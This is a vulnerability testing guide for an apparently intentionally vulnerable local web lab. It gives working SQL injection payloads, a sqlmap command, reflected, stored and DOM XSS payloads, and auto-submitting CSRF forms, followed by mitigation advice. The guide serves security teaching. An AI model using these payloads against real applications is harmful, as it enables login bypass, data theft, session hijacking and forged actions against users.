# Vulnerability Testing Guide - SQLMAP_Lab

This guide provides instructions and payloads for testing common web vulnerabilities found in this lab environment.

---

## 1. SQL Injection (SQLi)
The application fails to sanitize inputs in several places, allowing you to manipulate the underlying database.

### A. Authentication Bypass
*   **Target:** `login.php`
*   **Payload (Username field):** `admin' OR '1'='1`
*   **How it works:** This changes the SQL query to `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`, which is always true, logging you in as the first user (admin).

### B. Data Extraction (UNION-Based)
*   **Target:** `index.php?search=`
*   **Payload:** `' UNION SELECT 1, DATABASE(), USER(), VERSION(), 5 -- `
*   **Result:** The database name, current user, and version will appear in the blog post results.

### C. Automated Tool (sqlmap)
*   **Command:** `sqlmap -u "http://localhost/SQLMAP_Lab/index.php?search=test" --dbs`
*   **Next Step:** Once you have the database name, use `--tables` to see the tables.

---

## 2. Cross-Site Scripting (XSS)
The application reflects user input directly onto the page without encoding, allowing JavaScript execution.

### A. Reflected XSS
*   **Target:** `login.php?msg=`
*   **Payload:** `http://localhost/SQLMAP_Lab/login.php?msg=<script>alert('Reflected XSS')</script>&type=error`

### B. Stored XSS
*   **Target:** `create.php` (Submit a new post)
*   **Payload (Title or Content):** `<script>alert(document.cookie)</script>`
*   **Result:** Every user who visits the homepage will now see an alert box with their session cookie.

### C. DOM-Based XSS
*   **Target:** `index.php` (Using the URL Fragment)
*   **Payload:** `http://localhost/SQLMAP_Lab/index.php#<img src=x onerror=alert('DOM_XSS')>`
*   **How it works:** The JavaScript in `index.php` reads from `window.location.hash` and writes directly to `innerHTML`.

---

## 3. Cross-Site Request Forgery (CSRF)
The application lacks CSRF tokens on sensitive actions like creating, editing, or deleting posts.

### A. Forced Post Deletion
*   **Target:** `delete.php?id=[POST_ID]`
*   **Scenario:** If an admin is logged in and visits a malicious website, that website can trigger a deletion.
*   **Payload (HTML on a malicious site):**
    ```html
    <img src="http://localhost/SQLMAP_Lab/delete.php?id=1" style="display:none;">
    ```

### B. Forced Post Creation
*   **Target:** `create.php`
*   **Scenario:** An attacker can host a hidden form that auto-submits when a logged-in user visits their page.
*   **Payload (attacker.html):**
    ```html
    <form id="csrf-form" action="http://localhost/SQLMAP_Lab/create.php" method="POST">
        <input type="hidden" name="title" value="Hacked!">
        <input type="hidden" name="content" value="This post was created via CSRF.">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
    ```

### C. CSRF to Bypass Authorization (NEW - Shifat Attack)
*   **Target:** `edit.php?id=[POST_ID]`
*   **Scenario:** User `shifat` (password: 1234) is blocked from directly editing posts owned by other users. However, because there is NO CSRF token, shifat can force the actual owner (victim/admin) to submit an edit form unknowingly!
*   **Steps:**
    1. Login as `shifat` and try to edit a victim's post directly — you will see "Access Denied"
    2. Create a malicious page (`csrf_attack.html`) with a hidden form targeting `edit.php`
    3. Trick the victim (who owns the post) into visiting that page while logged in
    4. The victim's browser sends the request with THEIR session cookie, bypassing the authorization check!
*   **Payload (attacker.html):**
    ```html
    <form id="csrf-form" action="http://localhost/SQLMAP_Lab/edit.php?id=1" method="POST">
        <input type="hidden" name="title" value="HACKED BY SHIFAT">
        <input type="hidden" name="content" value="This post was modified via CSRF!">
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
    ```
*   **Why it works:** The server only checks WHO is making the request (via session cookie), not WHERE the request came from. Since the victim is the legitimate owner, the edit succeeds — even though shifat crafted the payload!

---

## 4. Mitigation Best Practices
To fix these, the lab would need:
1.  **Prepared Statements** for all SQL queries.
2.  **HTML Entity Encoding** (e.g., `htmlspecialchars()`) for all outputs.
3.  **CSRF Tokens** for every state-changing request (POST/GET/DELETE).
4.  **Proper Authorization Checks** that verify BOTH authentication AND the action's legitimacy (via CSRF tokens).
